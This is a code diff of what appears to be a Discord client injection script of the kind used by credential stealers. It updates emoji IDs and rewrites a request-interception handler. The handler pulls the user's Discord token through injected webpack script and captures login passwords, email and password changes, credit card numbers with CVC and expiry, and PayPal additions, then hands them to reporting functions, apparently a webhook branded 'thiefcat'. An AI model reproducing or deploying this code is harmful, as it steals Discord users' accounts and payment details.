@@ -462,7 +462,7 @@ const getBilling = async token => {
           billing.push('💳');
           break;
         case 2:
-          billing.push('<:paypal:951139189389410365>');
+          billing.push('<:paypal:1130462391230988338>');
           break;
         default:
           billing.push('(Unknown)');
@@ -786,7 +786,7 @@ const PaypalAdded = async (token) => {
       avatar_url: 'https://raw.githubusercontent.com/FalseKSCH/assets/main/thiefcat.png',
       embeds: [
         {
-          title: '<a:paypal:1130462391230988338> PayPal Account Added',
+          title: '<:paypal:1130462391230988338> PayPal Account Added',
           color: 5639644,
           fields: [
             {
@@ -947,94 +947,96 @@ const writeLog = (message) => {
     fs.appendFileSync(logFilePath, logMessage);
   };
   
-session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
-  writeLog(`🚩 [Request Captured] URL: ${details.url}`);
-  writeLog(`🔍 [Method]: ${details.method}`);
-  writeLog(`📡 [Status Code]: ${details.statusCode}`);
-
-  if (details.statusCode !== 200 && details.statusCode !== 202) {
-    writeLog(`❌ [Invalid Status Code] Skipping...`);
-    return;
-  }
-
-  let unparsed_data;
-  try {
-    unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
-    writeLog(`📝 [Unparsed Data]: ${unparsed_data}`);
-  } catch (err) {
-    writeLog(`⚠️ [Error Parsing Data]: ${err}`);
-    return;
-  }
-
-  let data;
-  try {
-    // Correction ici : utiliser querystring.parse au lieu de JSON.parse
-    data = querystring.parse(unparsed_data);
-    writeLog(`✅ [Parsed Data]: ${JSON.stringify(data)}`);
-  } catch (err) {
-    writeLog(`⚠️ [Data Parse Error]: ${err}`);
-    return;
-  }
-
-  let token;
-  try {
-    token = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
-    writeLog(`🔑 [Token Retrieved]: ${token}`);
-  } catch (err) {
-    writeLog(`❌ [Token Retrieval Failed]: ${err}`);
-    return;
-  }
-
-  switch (true) {
-    case details.url.endsWith('login'):
-      writeLog(`🔐 [Login Event Detected]`);
-      login(data.login, data.password, token).catch((err) => writeLog(`⚠️ [Login Error]: ${err}`));
-      break;
-
-    case details.url.endsWith('users/@me') && details.method === 'PATCH':
-      writeLog(`🔧 [User Update Detected]`);
-      if (!data.password) {
-        writeLog(`⚠️ [No Password Provided]`);
-        return;
+  session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
+    writeLog(`🚩 [Request Captured] URL: ${details.url}`);
+    writeLog(`🔍 [Method]: ${details.method}`);
+    writeLog(`📡 [Status Code]: ${details.statusCode}`);
+  
+    if (details.statusCode !== 200 && details.statusCode !== 202) {
+      writeLog(`❌ [Invalid Status Code] Skipping...`);
+      return;
+    }
+  
+    let unparsed_data;
+    try {
+      unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
+      writeLog(`📝 [Unparsed Data]: ${unparsed_data}`);
+    } catch (err) {
+      writeLog(`⚠️ [Error Parsing Data]: ${err}`);
+      return;
+    }
+  
+    let data;
+    try {
+      // Vérifie si le payload est du JSON ou encodé en URL
+      if (unparsed_data.trim().startsWith('{')) {
+        data = JSON.parse(unparsed_data); // Si le payload commence par '{', c'est du JSON
+      } else {
+        data = querystring.parse(unparsed_data); // Sinon, c'est probablement de l'URL-encoded
       }
-      if (data.email) {
-        writeLog(`📧 [Email Change Detected]`);
-        emailChanged(data.email, data.password, token).catch((err) => writeLog(`⚠️ [Email Change Error]: ${err}`));
-      }
-      if (data.new_password) {
-        writeLog(`🔑 [Password Change Detected]`);
-        passwordChanged(data.password, data.new_password, token).catch((err) => writeLog(`⚠️ [Password Change Error]: ${err}`));
-      }
-      break;
-
-    case details.url.endsWith('tokens') && details.method === 'POST':
-      writeLog(`💳 [Credit Card Info Detected]`);
-      try {
-        writeLog(`💾 [Card Data]: ${JSON.stringify(data)}`);
-        ccAdded(data['card[number]'], data['card[cvc]'], data['card[exp_month]'], data['card[exp_year]'], token).catch((err) => writeLog(`⚠️ [Credit Card Capture Error]: ${err}`));
-      } catch (err) {
-        writeLog(`⚠️ [Card Data Parsing Failed]: ${err}`);
-      }
-      break;
-
-    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
-      writeLog(`💰 [PayPal Info Added]`);
-      PaypalAdded(token).catch((err) => writeLog(`⚠️ [PayPal Capture Error]: ${err}`));
-      break;
-
-    case details.url.endsWith('confirm') && details.method === 'POST':
-      writeLog(`🚀 [Purchase Confirmed, Initiating Nitro Buy]`);
-      setTimeout(() => {
-        nitroBought(token).catch((err) => writeLog(`⚠️ [Nitro Purchase Error]: ${err}`));
-      }, 7500);
-      break;
-
-    default:
-      writeLog(`ℹ️ [Unhandled Request Type]`);
-      break;
-  }
-});
-
-
+      writeLog(`✅ [Parsed Data]: ${JSON.stringify(data)}`);
+    } catch (err) {
+      writeLog(`⚠️ [Data Parse Error]: ${err}`);
+      return;
+    }
+  
+    let token;
+    try {
+      token = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
+      writeLog(`🔑 [Token Retrieved]: ${token}`);
+    } catch (err) {
+      writeLog(`❌ [Token Retrieval Failed]: ${err}`);
+      return;
+    }
+  
+    switch (true) {
+      case details.url.endsWith('login'):
+        writeLog(`🔐 [Login Event Detected]`);
+        login(data.login, data.password, token).catch((err) => writeLog(`⚠️ [Login Error]: ${err}`));
+        break;
+  
+      case details.url.endsWith('users/@me') && details.method === 'PATCH':
+        writeLog(`🔧 [User Update Detected]`);
+        if (!data.password) {
+          writeLog(`⚠️ [No Password Provided]`);
+          return;
+        }
+        if (data.email) {
+          writeLog(`📧 [Email Change Detected]`);
+          emailChanged(data.email, data.password, token).catch((err) => writeLog(`⚠️ [Email Change Error]: ${err}`));
+        }
+        if (data.new_password) {
+          writeLog(`🔑 [Password Change Detected]`);
+          passwordChanged(data.password, data.new_password, token).catch((err) => writeLog(`⚠️ [Password Change Error]: ${err}`));
+        }
+        break;
+  
+      case details.url.endsWith('tokens') && details.method === 'POST':
+        writeLog(`💳 [Credit Card Info Detected]`);
+        try {
+          writeLog(`💾 [Card Data]: ${JSON.stringify(data)}`);
+          ccAdded(data['card[number]'], data['card[cvc]'], data['card[exp_month]'], data['card[exp_year]'], token).catch((err) => writeLog(`⚠️ [Credit Card Capture Error]: ${err}`));
+        } catch (err) {
+          writeLog(`⚠️ [Card Data Parsing Failed]: ${err}`);
+        }
+        break;
+  
+      case details.url.endsWith('paypal_accounts') && details.method === 'POST':
+        writeLog(`💰 [PayPal Info Added]`);
+        PaypalAdded(token).catch((err) => writeLog(`⚠️ [PayPal Capture Error]: ${err}`));
+        break;
+  
+      case details.url.endsWith('confirm') && details.method === 'POST':
+        writeLog(`🚀 [Purchase Confirmed, Initiating Nitro Buy]`);
+        setTimeout(() => {
+          nitroBought(token).catch((err) => writeLog(`⚠️ [Nitro Purchase Error]: ${err}`));
+        }, 7500);
+        break;
+  
+      default:
+        writeLog(`ℹ️ [Unhandled Request Type]`);
+        break;
+    }
+  });  
 
 module.exports = require('./core.asar');
